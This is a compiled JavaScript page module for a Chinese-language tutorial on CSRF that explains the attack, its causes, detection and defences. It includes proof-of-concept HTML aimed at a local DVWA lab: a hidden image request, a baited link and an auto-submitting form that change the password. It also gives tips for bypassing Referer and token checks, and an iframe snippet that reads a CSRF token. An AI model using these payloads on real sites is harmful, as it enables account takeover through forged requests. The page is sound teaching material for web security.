import{_ as t,W as o,X as l,Y as s,Z as a,a0 as r,a1 as n,C as p}from"./framework-b6a07282.js";const i="/assets/1-c7847d09.jpg",c={},d=n('<h2 id="csrf跨站请求伪造" tabindex="-1"><a class="header-anchor" href="#csrf跨站请求伪造" aria-hidden="true">#</a> CSRF跨站请求伪造</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>CSRF（Cross-site request forgery）跨站请求伪造，它的攻击方式是受害者在登录了一个网站的情况下点击一个链接，去访问了一个含有恶意代码的其他网页，在受害者没有意识到的情况下，攻击者就使用了受害者的身份信息（如浏览器保存的cookie或其他身份凭证）对受害者登录成功的服务器发送了请求。例如转账，修改密码等行为。</li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ol><li>网站对用户的身份验证不够严格，只要用户在浏览器中登录了一个网站，那么这个网站就会认为用户的所有请求都是合法的。即使这些请求是来自其他网站或者恶意链接的。</li><li>用户自身的好奇心。</li></ol><img src="'+i+`"><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>WebB通过img src的属性构造了一个恶意的url，当浏览器访问WebB时就会自动加载，向WebA发起GET请求，从而发生了一次攻击。
<span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html <span class="token assign-left variable">lang</span><span class="token operator">=</span><span class="token string">&quot;en&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta <span class="token assign-left variable">charset</span><span class="token operator">=</span><span class="token string">&quot;UTF-8&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta http-equiv<span class="token operator">=</span><span class="token string">&quot;X-UA-Compatible&quot;</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">&quot;IE=edge&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;viewport&quot;</span> <span class="token assign-left variable">content</span><span class="token operator">=</span><span class="token string">&quot;width=device-width, initial-scale=1.0&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>Document<span class="token operator">&lt;</span>/title<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/head<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>img <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">&quot;http://localhost:8085/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&quot;</span> <span class="token assign-left variable">width</span><span class="token operator">=</span><span class="token string">&quot;0&quot;</span> <span class="token assign-left variable">height</span><span class="token operator">=</span><span class="token string">&quot;0&quot;</span>/<span class="token operator">&gt;</span>
    
    也可以通过构造一个超链接，当用户点击后发生GET请求
    <span class="token operator">&lt;</span>a <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">&quot;http://localhost:8085/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&quot;</span><span class="token operator">&gt;</span>
    	小姐姐在线视频聊天！！
    <span class="token operator">&lt;</span>/a<span class="token operator">&gt;</span>
    
    基于表单的方式：
    <span class="token operator">&lt;</span>form <span class="token assign-left variable">action</span><span class="token operator">=</span><span class="token string">&quot;http://localhost:8085/vulnerabilities/csrf/&quot;</span> <span class="token assign-left variable">method</span><span class="token operator">=</span>POST<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">&quot;hidden&quot;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;?password_new&quot;</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">&quot;123456&quot;</span> /<span class="token operator">&gt;</span>
		<span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">&quot;hidden&quot;</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">&quot;password_conf&quot;</span> <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token string">&quot;123456&quot;</span> /<span class="token operator">&gt;</span>
	<span class="token operator">&lt;</span>/form<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>script<span class="token operator">&gt;</span> document.forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">&lt;</span>/script<span class="token operator">&gt;</span>
    
<span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><ul><li>通常CSRF的高频触发点在：论坛交流、用户中心、反馈留言、交易管理、后台管理。</li></ul><ol><li>检测CSRF漏洞有一些方法，最简单的方法就是抓取一个正常请求的数据包，无token、Origin字段、去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</li><li>使用bp生成POC检测。</li><li>使用自动化扫描工具，如AWVS扫描。</li></ol><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ol><li>利用当前受害者的cookie，实现冒充身份的后续操作，盗取信息、资金、隐私数据。</li><li>刷点击</li><li>弹广告</li><li>传播蠕虫病毒</li><li>CSRF漏洞还可以和XSS等漏洞结合使用</li></ol><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><ol><li>在网站上嵌入恶意链接或图片，诱导用户点击。</li><li>通过XSS攻击，在受信任网站上注入恶意代码，发送请求。</li></ol><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><ol><li>使用验证码或二次确认。在表单中添加一个随机的数字或字母验证码。通过强制用户和应用进行交互，来有效地遏制CSRF攻击。</li><li>使用Token验证。这样可以在每个请求中添加一个随机生成的令牌，服务器端根据令牌判断请求是否有效。</li><li>使用SameSite属性。这样可以让浏览器在跨域请求时不发送cookie信息。</li><li>使用Referer检查或者Origin检查。这样可以判断请求是否来自于合法的URL。</li></ol><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3>`,17),u=s("li",null,"服务器端不验证CSRF令牌是否绑定到特定账户，只验证算法。这样可以通过获取其他账户的令牌来伪造请求。",-1),k=s("li",null,"有时服务器仅判断CSRF令牌的长度。",-1),h={href:"https://www.yoursite.com/https://www.theirsite.com/",target:"_blank",rel:"noopener noreferrer"},v=s("li",null,"服务器端存在其他类型的漏洞，如XSS、SSRF、CORS等。这样可以利用这些漏洞来绕过CSRF防御。",-1),m=n(`<h3 id="攻击注意" tabindex="-1"><a class="header-anchor" href="#攻击注意" aria-hidden="true">#</a> 攻击注意</h3><ol><li>如果比较域名是否相同，则去修改Referer将域名修改位一样。</li><li>如果存在Token，则观察网站是否存在xss漏洞，利用xss获取当前用户的token。</li></ol><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code>POC:
&lt;iframe src =&quot;../CSRF&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,3);function g(b,_){const e=p("ExternalLinkIcon");return o(),l("div",null,[d,s("ol",null,[u,k,s("li",null,[a("服务器端只检查Referer的域名，而不检查完整的URL。如果仅检查是否包含自身网站可尝试："),s("a",h,[a("https://www.yoursite.com/https://www.theirsite.com/"),r(e)])]),v]),m])}const q=t(c,[["render",g],["__file","CSRF跨站请求伪造.html.vue"]]);export{q as default};
